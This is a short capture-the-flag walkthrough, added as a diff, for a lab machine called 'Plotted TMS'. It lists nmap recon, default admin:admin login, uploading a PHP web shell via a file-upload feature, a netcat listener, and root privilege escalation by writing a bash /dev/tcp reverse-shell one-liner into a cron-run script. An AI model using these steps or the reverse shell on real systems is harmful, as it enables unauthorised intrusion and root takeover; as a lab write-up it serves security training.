@@ -1,0 +1,44 @@
+----------------                               ------------------
+               :::::::::::;| PLOTTED TMS |;::::::::::::
+
+
+1) SPIN UP THE MACHINE AND NOTE IP.
+
+TASK - 1 (RECON)
+
+1. Full port scan:
+nmap -p- <ip> -vv
+"Ports 22/SSH and 8080/HTTP found"
+
+2. Web investigation:
+http://<ip>:8080
+"TMS application running"
+"Default creds admin:admin work"
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. Find upload feature:
+"Can upload .plt files"
+"Change extension to .php and upload shell"
+
+2. Get reverse shell:
+nc -lvnp 4444
+"Access uploaded shell at /uploads/"
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. Check cron jobs:
+cat /etc/crontab
+"Running script as root every minute"
+
+2. Write to script location:
+echo "bash -i >& /dev/tcp/<your_ip>/5555 0>&1" > script.sh
+"Wait for root shell connection"
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- TMS PWNED ----------
